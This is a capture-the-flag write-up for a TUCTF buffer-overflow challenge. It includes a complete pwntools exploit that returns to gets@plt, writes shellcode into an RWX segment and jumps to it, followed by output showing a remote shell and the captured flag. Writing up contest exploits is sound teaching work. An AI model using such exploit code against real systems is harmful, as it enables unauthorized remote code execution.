### Solved by superkojiman

Another vanilla buffer overflow. This time NX isn't enabled, but ASLR is. I could write and execute code on the stack, but then I'd need to leak a stack address. Too much work, when it's easier to just write directly into 0x0804a000 0x0804b000 which was also read/write/executable!

gdb-peda$ vmmap
Start      End        Perm      Name
0x08048000 0x08049000 r-xp      /root/tu/esp-good-jmp/23e4f31a5a8801a554e1066e26eb34745786f4c4
0x08049000 0x0804a000 r-xp      /root/tu/esp-good-jmp/23e4f31a5a8801a554e1066e26eb34745786f4c4
0x0804a000 0x0804b000 rwxp      /root/tu/esp-good-jmp/23e4f31a5a8801a554e1066e26eb34745786f4c4

Solution: return to gets@plt, write shellcode to 0x0804a000, and then return to 0x0804a000 to execute shellcode. 


```python
#!/usr/bin/env python
from pwn import *

r = remote("130.211.202.98" ,7575)

buf = ""
buf += "A"*44

buf += p32(0x80483d0)       # gets@plt
buf += p32(0x804a000)       # ret here after gets()
buf += p32(0x804a000)       # rwx address

# asks us for name
print r.recv()
r.sendline(buf)

# asks us for number
print r.recv()
r.sendline(asm(shellcraft.linux.sh()))

r.interactive()
```

Flag plundering time:

```
# ./sploit.py
[+] Opening connection to 130.211.202.98 on port 7575: Done
What's your name?

What's your favorite number?

[*] Switching to interactive mode
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAЃ\x0, 0 is an even number!
$ ls
easy
flag.txt
$ cat flag.txt
TUCTF{th0se_were_s0me_ESPecially_good_JMPs}
```
